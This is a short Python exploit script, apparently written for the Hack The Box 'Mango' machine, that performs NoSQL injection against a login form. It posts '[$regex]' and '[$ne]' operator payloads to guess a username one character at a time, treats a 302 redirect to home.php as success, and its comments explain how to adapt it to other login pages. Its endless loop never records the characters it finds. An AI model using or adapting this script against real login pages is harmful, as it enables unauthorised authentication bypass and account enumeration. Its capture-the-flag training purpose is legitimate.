# This Script was built for NoSql-Injection show in Hack The Box - Mango
# It can help you bruteforce first character of the the username once you have first character then you can use other script username-bruteforce.py on this repo to bruteforce username 
import requests
import urllib3
import string

# Disable SSL warnings
urllib3.disable_warnings()

username = ""

password = "itdoesntmatter"

# URL for the login
u = "http://example.local/"

# Headers for the POST request
headers = {'content-type': 'application/x-www-form-urlencoded'}

while True:
    # Loop through each letter from 'a' to 'z'. For uppercase replace ascii_lowercase with ascii_uppercase
    for c in string.ascii_lowercase:
        # Prepare the payload [$regex]=^%s.* and [$ne] is the payload we added in the POST data below. You might have to modify it according to the post data of the login page when you submit burpsuit can help to get this info 
        payload = 'username[$regex]=^%s.*&password[$ne]=%s&login=login' % (c, password)

        # Send the POST request
        r = requests.post(u, data=payload, headers=headers, verify=False, allow_redirects=False)

        # Check if the status code is 302 and the location header is 'home.php'
        if r.status_code == 302 and r.headers.get('Location') == 'home.php':
            # If a valid character is found, print it
            print(f"Found valid username character: {c}")
